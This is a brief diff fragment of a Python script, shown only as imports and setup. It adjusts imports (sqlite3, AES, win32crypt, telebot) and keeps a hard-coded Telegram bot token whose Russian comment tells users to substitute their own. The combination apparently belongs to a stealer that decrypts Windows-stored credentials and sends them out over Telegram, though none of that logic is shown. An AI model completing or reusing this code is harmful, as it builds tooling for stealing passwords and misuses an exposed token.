@@ -2,14 +2,11 @@ import subprocess
 import os
 import sys
 import sqlite3
-import base64
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import win32crypt
 import tkinter
 import telebot
-import json
-
 # Замените токен на свой токен бота
 bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U"
 bot = telebot.TeleBot(bot_token)
